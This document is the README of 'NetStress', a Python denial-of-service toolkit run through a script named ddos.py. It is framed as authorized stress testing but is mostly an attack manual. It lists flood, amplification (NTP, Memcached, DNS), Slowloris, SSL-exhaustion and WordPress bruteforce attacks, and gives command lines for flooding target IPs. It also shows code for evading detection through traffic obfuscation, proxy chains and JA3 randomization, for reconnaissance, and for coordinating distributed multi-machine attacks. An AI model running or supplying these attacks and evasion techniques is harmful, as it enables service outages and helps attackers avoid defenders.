# NetStress

A Python-based network stress testing tool for authorized security research and performance testing.

## Legal Notice

**⚠️ AUTHORIZED USE ONLY ⚠️**

This tool is for authorized security testing and performance evaluation only. You must have explicit written permission to test any target system. Unauthorized use against systems you do not own or have permission to test is illegal and may violate:

- Computer Fraud and Abuse Act (CFAA)
- Local cybersecurity laws
- Terms of service agreements

**Use responsibly. The authors assume no liability for misuse.**

## What This Tool Actually Does

NetStress is a Python-based network stress testing framework that generates various types of network traffic to evaluate system performance and resilience. It uses standard operating system networking APIs and socket operations - no kernel bypass or specialized hardware acceleration.

## Honest Capabilities Assessment

### What This Tool ACTUALLY Does:

- ✅ Sends real UDP/TCP/HTTP packets using standard OS sockets
- ✅ Uses `sendfile()` and `MSG_ZEROCOPY` on Linux when available
- ✅ Uses `sendmmsg()` for batch UDP sending on Linux (with root)
- ✅ Applies real socket optimizations (SO_SNDBUF, TCP_NODELAY)
- ✅ Provides honest performance metrics from OS counters
- ✅ **Advanced Evasion**: Traffic shaping, protocol obfuscation, timing patterns
- ✅ **Distributed Testing**: Multi-machine coordination with controller/agent architecture
- ✅ **Reconnaissance**: Port scanning, service detection, OS/web fingerprinting
- ✅ **Anti-Detection**: Proxy chains, traffic morphing, behavioral mimicry, fingerprint randomization
- ✅ **Advanced Attacks**: 30+ attack types including amplification, Layer 7, SSL, protocol-specific

### What This Tool Does NOT Do:

- ❌ **XDP/eBPF**: No kernel-level packet processing (use [xdp-tools](https://github.com/xdp-project/xdp-tools))
- ❌ **DPDK**: No kernel bypass networking (use [DPDK](https://www.dpdk.org/))
- ❌ **Hardware acceleration**: No specialized NIC features or SR-IOV
- ❌ **Multi-gigabit performance**: Limited by Python interpreter and OS network stack
- ❌ **Raw packet crafting**: Limited raw socket support (requires root/admin)
- ❌ **Real-time guarantees**: Subject to Python GIL and OS scheduling

### Realistic Performance Expectations:

| Platform     | UDP PPS   | TCP Conn/sec | Bandwidth |
| ------------ | --------- | ------------ | --------- |
| Linux (root) | 500K-2M   | 10K-50K      | 1-10 Gbps |
| Linux (user) | 100K-500K | 5K-20K       | 500M-5G   |
| Windows      | 50K-200K  | 2K-10K       | 100M-2G   |
| macOS        | 100K-300K | 5K-15K       | 500M-3G   |

**Note:** These are realistic ranges. Localhost tests don't reflect real network performance.

For detailed capabilities, run: `python ddos.py --status`

## Features

- **30+ Attack Types**: TCP, UDP, HTTP, HTTPS, DNS, ICMP, Amplification, SSL, and more
- **Cross-platform**: Windows, Linux, macOS support
- **Built-in Safety**: Target validation, resource monitoring, emergency shutdown
- **Advanced Evasion**: Traffic shaping, protocol obfuscation, timing manipulation
- **Distributed Testing**: Multi-machine coordination for large-scale testing
- **Reconnaissance**: Port scanning, service detection, OS/web fingerprinting
- **Anti-Detection**: Proxy chains, traffic morphing, behavioral mimicry
- **Application Attacks**: WordPress, GraphQL, WebSocket, REST API targeting

## Quick Start

```bash
git clone https://github.com/Destroyer-official/-NetStress-.git
cd -NetStress-
pip install -r requirements.txt
python ddos.py --help
```

## Supported Attack Types

### Basic Floods

| Protocol | Type    | Description          |
| -------- | ------- | -------------------- |
| TCP      | Flood   | TCP connection flood |
| UDP      | Flood   | UDP packet flood     |
| HTTP     | Layer 7 | HTTP request flood   |
| HTTPS    | Layer 7 | HTTPS request flood  |
| DNS      | Query   | DNS query flood      |
| ICMP     | Echo    | ICMP echo flood      |

### Connection-Level Attacks

| Attack                | Type | Description           |
| --------------------- | ---- | --------------------- |
| SYN Flood             | Raw  | TCP SYN flag flood    |
| ACK Flood             | Raw  | TCP ACK flag flood    |
| RST Flood             | Raw  | TCP RST flag flood    |
| FIN Flood             | Raw  | TCP FIN flag flood    |
| XMAS Flood            | Raw  | FIN+PSH+URG flags     |
| NULL Scan             | Raw  | No flags set          |
| Connection Exhaustion | TCP  | Hold connections open |

### Layer 7 Attacks

| Attack           | Type | Description                     |
| ---------------- | ---- | ------------------------------- |
| HTTP Flood       | L7   | High-volume HTTP requests       |
| Slowloris        | L7   | Slow header attack              |
| Slow POST (RUDY) | L7   | Slow body transmission          |
| Cache Bypass     | L7   | Unique requests to bypass cache |
| HTTP Smuggling   | L7   | Request smuggling attack        |

### Amplification Attacks

| Attack    | Factor | Description                       |
| --------- | ------ | --------------------------------- |
| DNS       | 28x    | DNS ANY query amplification       |
| NTP       | 556x   | NTP monlist amplification         |
| SSDP      | 30x    | UPnP SSDP amplification           |
| Memcached | 51000x | Memcached stats amplification     |
| Chargen   | 358x   | Character generator amplification |
| SNMP      | 6.3x   | SNMP GetBulk amplification        |

### SSL/TLS Attacks

| Attack            | Type | Description                    |
| ----------------- | ---- | ------------------------------ |
| SSL Exhaustion    | CPU  | Exhaust server with handshakes |
| SSL Renegotiation | CPU  | Force expensive renegotiations |
| THC-SSL-DOS       | CPU  | Combined SSL attack            |
| Heartbleed Test   | Vuln | CVE-2014-0160 detection        |

### Protocol-Specific Attacks

| Attack      | Protocol | Description            |
| ----------- | -------- | ---------------------- |
| DNS Flood   | DNS      | DNS query flood        |
| SMTP Flood  | SMTP     | SMTP command flood     |
| FTP Bounce  | FTP      | FTP PORT command abuse |
| MySQL Flood | MySQL    | MySQL connection flood |
| Redis Flood | Redis    | Redis command flood    |

### Application Attacks

| Attack             | Target    | Description             |
| ------------------ | --------- | ----------------------- |
| WordPress XMLRPC   | WordPress | Pingback amplification  |
| WordPress Login    | WordPress | Login bruteforce        |
| API Flood          | REST API  | API endpoint flood      |
| WebSocket Flood    | WebSocket | WebSocket message flood |
| GraphQL Deep Query | GraphQL   | Deeply nested queries   |
| GraphQL Batch      | GraphQL   | Batched query attack    |

## Usage

```bash
python ddos.py -i TARGET -p PORT -t PROTOCOL [OPTIONS]

Required:
  -i, --ip      Target IP or hostname
  -p, --port    Target port
  -t, --type    Protocol (TCP, UDP, HTTP, etc.)

Optional:
  -d, --duration    Duration in seconds (default: 60)
  -x, --threads     Worker threads (default: 4)
  -s, --size        Packet size in bytes (default: 1472)
  --status          Show system status
```

## Examples

```bash
# UDP flood
python ddos.py -i 192.168.1.100 -p 80 -t UDP -d 60

# HTTP flood
python ddos.py -i 192.168.1.100 -p 80 -t HTTP -x 8 -d 60

# Check status
python ddos.py --status
```

## Advanced Evasion

NetStress includes sophisticated evasion techniques to bypass basic detection:

### Traffic Shaping Profiles

```python
from core.evasion import TrafficShaper, ShapingProfile, ShapingConfig

# Stealthy mode - low rate with high randomization
shaper = TrafficShaper(ShapingConfig(
    profile=ShapingProfile.STEALTHY,
    jitter_percent=0.3
))

# Burst mode - periodic bursts with quiet periods
shaper = TrafficShaper(ShapingConfig(
    profile=ShapingProfile.BURST,
    burst_size=100,
    burst_interval=2.0
))

# Human mimicry - simulate legitimate user patterns
shaper = TrafficShaper(ShapingConfig(
    profile=ShapingProfile.MIMICRY
))
```

### Protocol Obfuscation

```python
from core.evasion import ProtocolObfuscator, ObfuscationMethod, ObfuscationConfig

# XOR encoding
obfuscator = ProtocolObfuscator(ObfuscationConfig(
    method=ObfuscationMethod.XOR_ENCODE,
    xor_key=b'\x42\x13\x37'
))

# HTTP mimicry - wrap traffic as HTTP requests
obfuscator = ProtocolObfuscator(ObfuscationConfig(
    method=ObfuscationMethod.PROTOCOL_MIMICRY,
    mimic_protocol="http"
))

# Polymorphic encoding - different encoding each packet
obfuscator = ProtocolObfuscator(ObfuscationConfig(
    method=ObfuscationMethod.POLYMORPHIC
))
```

### Timing Patterns

- **CONSTANT**: Fixed interval
- **HUMAN**: Human-like with think time
- **POISSON**: Natural random events
- **RANDOM_WALK**: Gradually changing rate
- **PULSE**: On-off pattern
- **ADAPTIVE**: Adjusts based on target response

## Reconnaissance

NetStress includes comprehensive reconnaissance capabilities:

### Port Scanning

```python
from core.recon import TCPScanner, SYNScanner, UDPScanner, ScanConfig

# TCP Connect scan
config = ScanConfig(target='192.168.1.100', ports=list(range(1, 1025)))
scanner = TCPScanner(config)
results = await scanner.scan()
print(f"Open ports: {scanner.get_open_ports()}")

# SYN scan (requires root)
scanner = SYNScanner(config)
results = await scanner.scan()
```

### Service Detection

```python
from core.recon import ServiceDetector

detector = ServiceDetector('192.168.1.100')
services = await detector.detect_all([22, 80, 443, 3306])
for svc in services:
    print(f"Port {svc['port']}: {svc['service']} {svc['version']}")
```

### Fingerprinting

```python
from core.recon import OSFingerprint, WebFingerprint, TLSFingerprint

# OS fingerprinting
os_fp = OSFingerprint('192.168.1.100')
result = await os_fp.fingerprint()
print(f"OS: {result.os_name} (confidence: {result.confidence})")

# Web fingerprinting
web_fp = WebFingerprint('example.com', port=443, ssl=True)
result = await web_fp.fingerprint()
print(f"Server: {result.server}, CMS: {result.cms}, Framework: {result.framework}")

# TLS fingerprinting
tls_fp = TLSFingerprint('example.com')
result = await tls_fp.fingerprint()
print(f"Protocols: {result['protocols']}, Cipher: {result['cipher']}")
```

### Vulnerability Scanning

```python
from core.recon import VulnerabilityScanner, TargetAnalyzer

# Quick vulnerability scan
scanner = VulnerabilityScanner('192.168.1.100')
vulns = await scanner.scan([22, 80, 443, 3306, 6379])
for vuln in vulns:
    print(f"[{vuln['severity']}] {vuln['title']}")

# Comprehensive analysis
analyzer = TargetAnalyzer('example.com')
report = await analyzer.analyze(full_scan=True)
```

## Anti-Detection

NetStress provides advanced anti-detection capabilities:

### Proxy Chains

```python
from core.antidetect import ProxyChain, ProxyRotator, ProxyConfig, ProxyType

# Single proxy
proxy = ProxyConfig(host='proxy.example.com', port=1080, proxy_type=ProxyType.SOCKS5)

# Proxy chain (traffic goes through multiple proxies)
chain = ProxyChain([
    ProxyConfig(host='proxy1.example.com', port=1080, proxy_type=ProxyType.SOCKS5),
    ProxyConfig(host='proxy2.example.com', port=8080, proxy_type=ProxyType.HTTP),
])
reader, writer = await chain.connect('target.com', 80)

# Proxy rotation
rotator = ProxyRotator(proxies, strategy='best_latency')  # or 'round_robin', 'random'
reader, writer = await rotator.connect('target.com', 80)
```

### Traffic Morphing

```python
from core.antidetect import TrafficMorpher, MorphConfig, MorphType

# Make traffic look like HTTP
morpher = TrafficMorpher(MorphConfig(morph_type=MorphType.HTTP))
morphed_data = morpher.morph(attack_payload)

# Make traffic look like DNS
morpher = TrafficMorpher(MorphConfig(morph_type=MorphType.DNS))
morphed_data = morpher.morph(attack_payload)

# WebSocket framing
morpher = TrafficMorpher(MorphConfig(morph_type=MorphType.WEBSOCKET))
morphed_data = morpher.morph(attack_payload)
```

### Behavioral Mimicry

```python
from core.antidetect import BehavioralMimicry, BehaviorConfig, BehaviorProfile

# Simulate casual user behavior
mimicry = BehavioralMimicry(BehaviorConfig(profile=BehaviorProfile.CASUAL))
session = await mimicry.session_manager.create_session()

# Browse with realistic timing
await mimicry.browse_page(session, '/products', content_length=5000)
await mimicry.search(session, 'test query')
await mimicry.fill_form(session, {'username': 'test', 'password': 'test'})
```

### Fingerprint Randomization

```python
from core.antidetect import FingerprintRandomizer, JA3Randomizer, HeaderRandomizer

# Randomize browser fingerprint
fp_random = FingerprintRandomizer()
profile = fp_random.get_random_profile()
headers = fp_random.get_headers('target.com')

# Randomize JA3 TLS fingerprint
ja3_random = JA3Randomizer()
ja3 = ja3_random.generate_random_ja3()
print(f"JA3 Hash: {ja3_random.get_ja3_hash()}")

# Randomize HTTP headers
header_random = HeaderRandomizer()
headers = header_random.randomize_headers(base_headers)
headers = header_random.add_noise_headers(headers)
```

## Distributed Testing

NetStress supports multi-machine coordination for large-scale testing:

### Controller (Main Machine)

```python
from core.distributed import DistributedController, ControllerConfig
from core.distributed import AttackCoordinator, CoordinatedAttack

# Start controller
controller = DistributedController(ControllerConfig(
    bind_port=9999,
    secret_key=b"your-secret-key"
))
await controller.start()

# Wait for agents to connect
coordinator = AttackCoordinator(controller)
await coordinator.wait_for_agents(count=3, timeout=60)

# Execute coordinated attack
attack = CoordinatedAttack(
    name="distributed_test",
    target="192.168.1.100",
    port=80,
    protocol="HTTP",
    duration=60,
    total_rate=100000,  # Distributed across all agents
    use_evasion=True,
    shaping_profile="stealthy"
)
results = await coordinator.execute_attack(attack)
```

### Agent (Worker Machines)

```python
from core.distributed import DistributedAgent, AgentConfig

agent = DistributedAgent(AgentConfig(
    controller_host="192.168.1.1",
    controller_port=9999,
    secret_key=b"your-secret-key"
))
await agent.start()
```

### Features

- **Synchronized Start**: All agents start simultaneously
- **Staggered Start**: Agents start with configurable delays
- **Multi-Phase Attacks**: Different settings per phase
- **Real-time Monitoring**: Aggregated statistics from all agents
- **Automatic Failover**: Handles agent disconnections gracefully

## Requirements

- Python 3.8+
- Dependencies: `pip install -r requirements.txt`
- Admin/root for raw packet protocols (TCP-SYN, ICMP, etc.)

## Important Limitations

### Performance Constraints

- **Python Interpreter Overhead**: ~10-100x slower than equivalent C/C++ tools
- **Global Interpreter Lock (GIL)**: Limits CPU-bound parallelism to single core
- **Memory Management**: Garbage collection can cause periodic latency spikes
- **Standard Network Stack**: Uses OS sockets, not kernel bypass (DPDK/XDP)

### Testing Limitations

- **Localhost Deception**: Tests against 127.0.0.1 measure memory copy speed, not network performance
- **Single Machine**: Cannot simulate distributed attacks or realistic traffic patterns
- **Resource Bounded**: Limited by your machine's CPU, memory, and network interface
- **OS Dependent**: Performance varies significantly between Windows, Linux, and macOS

### Realistic Use Cases

✅ **Good for:**

- Educational purposes and learning network protocols
- Basic load testing of development servers
- Proof-of-concept security demonstrations
- Understanding network behavior under stress

❌ **Not suitable for:**

- Production-grade performance testing (use iperf3, wrk, or commercial tools)
- Realistic DDoS simulation (use distributed testing frameworks)
- High-throughput benchmarking (use compiled tools like hping3)
- Advanced penetration testing (use specialized security tools)

## Project Structure

```
NetStress/
├── ddos.py           # Main script
├── main.py           # Entry point
├── core/             # Core modules
├── config/           # Configuration
├── docs/             # Documentation
└── tests/            # Tests
```

## Safety Features

- Target validation
- Resource monitoring
- Emergency shutdown (Ctrl+C)
- Audit logging

## Documentation

- [Quick Start](docs/QUICK_START.md)
- [Usage Guide](docs/USAGE.md)
- [Troubleshooting](docs/TROUBLESHOOTING.md)

## License

MIT License - see [LICENSE](LICENSE)

## Disclaimer

This is an educational tool for authorized testing only. The authors are not responsible for misuse. Users must comply with all applicable laws.
